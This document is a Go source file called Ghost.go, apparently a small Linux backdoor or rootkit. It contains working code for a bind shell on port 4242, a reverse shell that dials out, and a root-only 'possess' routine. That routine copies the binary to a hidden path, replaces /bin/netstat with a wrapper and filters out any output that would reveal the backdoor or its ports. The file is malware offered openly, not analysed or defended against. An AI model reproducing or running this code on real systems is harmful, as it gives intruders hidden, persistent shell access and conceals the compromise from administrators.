//
// Ghost.go
//
// lukem1
// 30 March 2021
//

package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
)

// Write a message to all pts sessions
func ghostsay(msg string) {
	dir := "/dev/pts"
	pts, e := os.ReadDir(dir)
	if e != nil {
		log.Printf(e.Error())
	}
	
	for _, s := range pts {
		f := fmt.Sprintf("%s/%s", dir, s.Name())
		if s.Name() != "ptmx" {
			os.WriteFile(f, []byte(msg), 0666)
		}
	}
}


// dial connects to the specified host:port and creates a reverse shell
func dial(host string, port int) {
	log.Printf("Calling %s:%d...\n", host, port)
	
	c, e := net.Dial("tcp",fmt.Sprintf("%s:%d", host, port))
	if e != nil {
		log.Printf("Failed to connect.\n")
		return
	}
	log.Printf("Connected to %s:%d.\n", host, port)
	banner := "Ghost is Listening...\n"
	c.Write([]byte(banner))
	
	shell := exec.Command("/bin/bash")
	shell.Stdin=c;shell.Stdout=c;shell.Stderr=c;
	shell.Run()
}


// bind listens on the specified tcp port and provides a shell
func bind(port int) {
	// Start listening on the specified tcp port
	l, e := net.Listen("tcp", fmt.Sprintf(":%d", port))
	log.Printf("Listening on port %d...\n", port) 
	if e != nil {
		log.Fatal(e)
	}
	
	// Close the listener when bind returns
	defer l.Close()
	
	// session func to handle connections
	session := func (c net.Conn) {
		log.Printf("Recieved connection from %s!\n", c.RemoteAddr())
		banner := "Ghost is Listening...\n"
		c.Write([]byte(banner))
		
		// Execute bash and pass to the connection
		shell := exec.Command("/bin/bash")
		shell.Stdin = c; shell.Stdout = c; shell.Stderr = c;
		shell.Run()
		
		c.Close()
		log.Printf("Connection from %s closed.\n", c.RemoteAddr())
	}
	
	// Accept any incoming connections
	for {
		c, e := l.Accept()
		if e != nil {
			log.Print(e)
		}
		// Start a goroutine to handle any connections
		go session(c)
	}
}

// Copy file src to dst and assign the permissions mode
func copyfile(src string, dst string, mode os.FileMode) {
	source, e := os.Open(src)
	if e != nil {
		log.Fatal("Error reading file.")
	}
	defer source.Close()
	
	dest, e := os.Create(dst)
	if e != nil {
		log.Fatal("Error creating file.")
	}
	defer dest.Close()
	io.Copy(dest, source)
	
	// Place chmod on defer stack so it executes after dest.Close()
	defer os.Chmod(dst, mode)
}

// Possess some executables
func possess() {
	if os.Getuid() != 0 {
		log.Fatal("possess requires root.")
	}
	ghostpath := "/bin/.gnughost"
	targets := [1]string{"/bin/netstat"}
	//targets := [6]string{"/bin/ls","/bin/cp","/bin/apt","/bin/who", "/bin/netstat", "/bin/ps"}
	
	// Copy Ghost to ghostpath if not there already
	if _, e := os.Stat(ghostpath); os.IsNotExist(e) {
		exe, _ := os.Executable()
		copyfile(exe, ghostpath, 0755)
	}
	
	// Copy targets to hidden files
	for _, t := range targets {
		if _, e := os.Stat(t); !os.IsNotExist(e) {
			s := strings.Split(t, "/")
			tcopy := fmt.Sprintf("/bin/.ghost%s", s[len(s)-1])
			if _, e := os.Stat(tcopy); os.IsNotExist(e) {
				copyfile(t, tcopy, 0755)
			}
		}
	}
	
	// Overwrite targets with mimic script
	
	mimic := fmt.Sprintf("#!/bin/bash\n%s --pretend $0 $@", ghostpath)
	
	for _, target := range targets {
		os.Remove(target)
		clone, e := os.Create(target)
		if e != nil {
			log.Fatal(e.Error())
		}
		defer clone.Close()
		clone.WriteString(mimic)
		defer os.Chmod(target, 0755)
	}
	
}

// Pretend to be another executable, filtering out revealing info
func pretend(exe string, args []string) {
	s := strings.Split(exe, "/")
	exename := s[len(s)-1]
	ghostexe := fmt.Sprintf("/bin/.ghost%s", exename)
	raw, _ := exec.Command(ghostexe, args...).CombinedOutput()
	out := strings.Split(string(raw), "\n")
	
	patterns := [4]string{"ghost", string(os.Getpid()), "4242", "2424"}
	for _, line := range out {
		safe := true
		for _, p := range patterns {
			if strings.Contains(strings.ToLower(line), p) {
				safe = false
				break
			}
		}
		if safe {
			fmt.Println(line)
		}
	}
}

func main() {
	/*
	fmt.Printf("Hello from %d", os.Getpid())
	fmt.Printf(" (ppid: %d, uid: %d)\n", os.Getppid(), os.Getuid())
	fmt.Printf("argv: %v\n", os.Args)
	*/
	
	if len(os.Args) == 1 {
		return
	}
	
	if os.Args[1] == "--pretend" {
		pretend(os.Args[2], os.Args[3:])
	} else if os.Args[1] == "--possess" {
		possess()
	} else if os.Args[1] == "--bind" {
		var wait sync.WaitGroup
		wait.Add(1)
		go func () {
			bind(4242)
			wait.Done()
		}()
		// Do not exit unless goroutine has exited
		wait.Wait()
	}
	
	//ghostsay("\nHello\n")
	//dial("", 2424)
}
